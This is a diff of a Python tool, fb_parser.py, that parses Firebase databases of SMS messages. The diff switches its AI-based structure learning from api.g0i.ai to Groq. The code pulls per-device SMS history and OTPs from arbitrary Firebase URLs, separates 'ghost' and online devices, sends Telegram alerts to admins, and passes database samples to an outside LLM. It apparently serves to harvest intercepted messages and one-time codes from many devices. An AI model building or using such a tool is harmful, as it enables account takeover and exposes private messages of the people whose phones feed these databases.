@@ -1,13 +1,14 @@
 """
-fb_parser.py — Universal Firebase SMS Database Parser  v3
+fb_parser.py — Universal Firebase SMS Database Parser  v4
 ==========================================================
 Patterns: G, H, A, A2, A3, I, J, K, AI (learned)
 
-v3 additions:
-  - AI via api.g0i.ai  →  qwen3-coder-80b (structure learning)
+v4 changes:
+  - AI via Groq API → llama-3.3-70b-versatile (structure learning)
   - Telegram alerts    →  on learned / on parse failure
   - fetch_sms_history  →  last N messages, newest first
   - Fixed OTP for numeric-key DBs
+  - Strict ghost/online separation
 """
 
 import asyncio
@@ -30,15 +31,15 @@ except ImportError:
 # CONFIG  —  set as env vars on your VPS
 # ═══════════════════════════════════════════════════════════════
 
-OPENAI_KEY   = os.environ.get("OPENAI_API_KEY", "")   # your api.g0i.ai key
+GROQ_KEY   = os.environ.get("GROQ_API_KEY", "")   # your Groq API key
 BOT_TOKEN    = os.environ.get("TG_BOT_TOKEN",   "")   # Telegram bot token
 ADMIN_IDS    = [
     int(x) for x in os.environ.get("TG_ADMIN_IDS", "").split(",") if x.strip().isdigit()
 ]
 
-# AI endpoint (api.g0i.ai compatible)
-AI_BASE_URL    = "https://api.g0i.ai/v1"
-AI_MODEL       = "qwen3-coder-80b"
+# Groq AI endpoint
+GROQ_BASE_URL = "https://api.groq.com/openai/v1"
+GROQ_MODEL    = "llama-3.3-70b-versatile"
 
 LEARNED_PATTERNS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "learned_patterns")
 
@@ -734,19 +735,19 @@ Return ONLY valid JSON — no markdown, no explanation:
 
 
 async def ai_learn_structure(base: str, api_key: str = None,
-                              openai_key: str = None,
+                              groq_key: str = None,
                               bot_token: str = None,
                               admin_ids: list = None) -> tuple:
     """
-    Use qwen3-coder-80b (via api.g0i.ai) to learn an unknown Firebase structure.
+    Use llama-3.3-70b-versatile (via Groq) to learn an unknown Firebase structure.
     Sends Telegram alerts on success or failure.
     Returns (entries, pattern, error_str|None).
     """
-    key = openai_key or OPENAI_KEY
+    key = groq_key or GROQ_KEY
     if not key:
-        msg = f"⚠️ <b>AI Fallback Failed</b>\n<code>{_host_slug(base)}</code>\nReason: OPENAI_API_KEY not set"
+        msg = f"⚠️ <b>AI Fallback Failed</b>\n<code>{_host_slug(base)}</code>\nReason: GROQ_API_KEY not set"
         tg_alert(msg, bot_token, admin_ids)
-        return [], {}, "OPENAI_API_KEY not set"
+        return [], {}, "GROQ_API_KEY not set"
 
     print(f"[fb_parser] 🤖 AI learning: {base}")
 
@@ -776,15 +777,15 @@ async def ai_learn_structure(base: str, api_key: str = None,
                         sample[rk][child_id] = sub
                     break
 
-    # ── Call qwen3-coder-80b ──────────────────────────────────
+    # ── Call Groq llama-3.3-70b-versatile ──────────────────────────────────
     prompt = f"Firebase database sample:\n\n{json.dumps(sample, indent=2, default=str)[:6000]}"
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.post(
-                f"{AI_BASE_URL}/chat/completions",
+                f"{GROQ_BASE_URL}/chat/completions",
                 headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
                 json={
-                    "model": AI_MODEL,
+                    "model": GROQ_MODEL,
                     "messages": [
                         {"role": "system", "content": _AI_SYSTEM_PROMPT},
                         {"role": "user",   "content": prompt},
@@ -795,12 +796,12 @@ async def ai_learn_structure(base: str, api_key: str = None,
                 timeout=aiohttp.ClientTimeout(total=40),
             ) as r:
                 if r.status != 200:
-                    err = f"AI API error {r.status}: {await r.text()}"
+                    err = f"Groq API error {r.status}: {await r.text()}"
                     tg_alert(f"⚠️ <b>AI Learning Failed</b>\n<code>{_host_slug(base)}</code>\n{err[:200]}", bot_token, admin_ids)
                     return [], {}, err
                 data = await r.json(content_type=None)
     except Exception as e:
-        err = f"AI request failed: {e}"
+        err = f"Groq request failed: {e}"
         tg_alert(f"⚠️ <b>AI Learning Failed</b>\n<code>{_host_slug(base)}</code>\n{err}", bot_token, admin_ids)
         return [], {}, err
 
@@ -849,7 +850,7 @@ async def ai_learn_structure(base: str, api_key: str = None,
 # MAIN DETECTOR
 # ═══════════════════════════════════════════════════════════════
 
-async def _detect_and_parse(sess, base, api_key=None, openai_key=None,
+async def _detect_and_parse(sess, base, api_key=None, groq_key=None,
                              bot_token=None, admin_ids=None):
     # ── Try learned pattern first ─────────────────────────────
     learned = load_learned_pattern(base)
@@ -924,7 +925,7 @@ async def _detect_and_parse(sess, base, api_key=None, openai_key=None,
     if rows: return rows, "Z", None
 
     # ── AI Fallback ───────────────────────────────────────────
-    ai_key = openai_key or OPENAI_KEY
+    ai_key = groq_key or GROQ_KEY
     if ai_key:
         print(f"[fb_parser] All patterns failed — AI fallback for {base}")
         entries, pattern, err = await ai_learn_structure(
@@ -951,18 +952,18 @@ async def _detect_and_parse(sess, base, api_key=None, openai_key=None,
 # PUBLIC API
 # ═══════════════════════════════════════════════════════════════
 
-async def parse_db(url: str, api_key: str = None, openai_key: str = None):
+async def parse_db(url: str, api_key: str = None, groq_key: str = None):
     base = url.replace("/.json","").replace(".json","").rstrip("/")
     async with aiohttp.ClientSession() as sess:
-        rows, _, _ = await _detect_and_parse(sess, base, api_key, openai_key)
+        rows, _, _ = await _detect_and_parse(sess, base, api_key, groq_key)
     return rows
 
 
-async def parse_db_full(url: str, api_key: str = None, openai_key: str = None,
+async def parse_db_full(url: str, api_key: str = None, groq_key: str = None,
                          bot_token: str = None, admin_ids: list = None):
     base = url.replace("/.json","").replace(".json","").rstrip("/")
     async with aiohttp.ClientSession() as sess:
-        return await _detect_and_parse(sess, base, api_key, openai_key, bot_token, admin_ids)
+        return await _detect_and_parse(sess, base, api_key, groq_key, bot_token, admin_ids)
 
 
 async def fetch_latest_sms(entry: DeviceEntry, api_key: str = None, pattern: dict = None):
